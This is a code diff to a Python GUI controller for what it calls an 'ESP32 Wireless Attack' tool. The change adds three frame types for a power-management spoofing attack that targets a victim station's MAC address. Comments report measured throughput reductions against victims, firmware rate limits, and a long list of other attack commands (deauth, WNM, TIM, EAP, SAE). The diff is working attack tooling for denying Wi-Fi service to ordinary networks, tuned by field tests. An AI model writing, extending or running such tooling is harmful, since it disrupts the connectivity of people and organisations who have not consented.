@@ -96,8 +96,17 @@ AUTH_MODES = [
     "auth - 只发 Authentication",
     "assoc - 只发 Association Request",
 ]
-# PS-Poll 那一半已删除：单播的子类型 10 帧在本 MAC 上发不出去（实测 0/10，
-# 广播 RA 同样 16 字节 10/10 抓到），详见 attack-principles.md 附录 A。
+# PM 位可以装在三种帧里，各家协议栈认的不一样，所以做成可选项：
+#   null    = Null Data（data 4），规范里的标准省电声明帧
+#   qosnull = QoS Null（data 12），QoS/WMM 关联用的形式
+#   action  = 单播 Action（管理 13，类别 127 厂商自定义，不属于 PMF 的 robust 集合）
+# PS-Poll 那一半已删除：单播的子类型 10 帧在本 MAC 上发不出去（实测 0/10），
+# 详见 attack-principles.md 附录 A。
+PSPOLL_SHAPES = [
+    "qosnull - QoS Null（默认：实测最强，-38%）",
+    "null - Null Data（规范标准形式，实测 -30%）",
+    "action - 单播 Action（类别 127，实测 -21%）",
+]
 
 DELBA_REASONS = [
     "37 - 不再使用该机制",
@@ -371,6 +380,7 @@ class DeautherApp:
         self.auth_mode_var = tk.StringVar(value=AUTH_MODES[0])
         self.auth_auto_var = tk.BooleanVar(value=True)
         self.pspoll_mac_var = tk.StringVar()
+        self.pspoll_shape_var = tk.StringVar(value=PSPOLL_SHAPES[0])
 
         root.title("ESP32 Wireless Attack 上位机")
         root.geometry("1040x700")
@@ -941,10 +951,11 @@ class DeautherApp:
 
         params = ttk.Frame(page)
         params.pack(fill="x", pady=(4, 6))
-        ttk.Label(params, text="受害 STA MAC（空=嗅探学习）：").pack(side="left")
+        ttk.Label(params, text="帧型：").pack(side="left")
+        ttk.Combobox(params, textvariable=self.pspoll_shape_var, values=PSPOLL_SHAPES,
+                     state="readonly", width=44).pack(side="left")
+        ttk.Label(params, text="  受害 STA MAC（空=嗅探学习）：").pack(side="left")
         ttk.Entry(params, textvariable=self.pspoll_mac_var, width=16).pack(side="left")
-        ttk.Label(params, text="   每第 6 帧发一次 PM=0 把缓存“放”掉",
-                  foreground="#555555").pack(side="left")
 
         actions = ttk.Frame(page)
         actions.pack(fill="x", pady=(6, 4))
@@ -957,6 +968,8 @@ class DeautherApp:
         ttk.Label(
             page,
             text=("说明：\n"
+                  "• 帧型三种都带 PM 位、都不受 PMF 保护，但各家协议栈认的帧不同："
+                  "null=Null Data（默认）、qosnull=QoS Null、action=单播 Action(127)；\n"
                   "• 帧是单播、要 ACK，节拍 10 帧/s：20 帧/s 时这块驱动的短缓存池会在"
                   "几百帧后打满并触发 0x101 重启（实测）；\n"
                   "• AID/PS-Poll 那一半已删除：单播的子类型 10 帧发不出去（实测 0/10 上空气），"
@@ -1409,9 +1422,11 @@ class DeautherApp:
             messagebox.showerror("PM 欺骗参数无效",
                                  "STA MAC 要 12 位十六进制（可带冒号），例如 02:AABB:CCDD:EE。")
             return
+        shape = self.pspoll_shape_var.get().split(" ")[0]
         command = f"PSPOLL {self.single_index}"
         if mac:
             command += f" {mac}"
+        command += f" {shape}"
         self._send(command)
 
     def pspoll_stop(self):
@@ -1517,7 +1532,7 @@ class DeautherApp:
                         "wnm", "wnmf", "wnmc", "wnmskip", "wnmresp", "wnms",
                         "tim", "timf", "timaid", "timreal",
                         "eap", "eapf", "eaprx", "eaprxreq", "eaprxsta",
-                        "psp", "pspf", "pspnul", "pspfl", "pspc", "pspdl",
+                        "psp", "pspfrm", "pspf", "pspnul", "pspfl", "pspc", "pspdl",
                         "psprxp", "psprxn", "psprxpm",
                         "sae", "saesec", "saef", "saec", "saeresp", "saecode", "saetok", "saeecho",
                         "af", "aff", "afa", "afs", "afids", "afst", "afup",
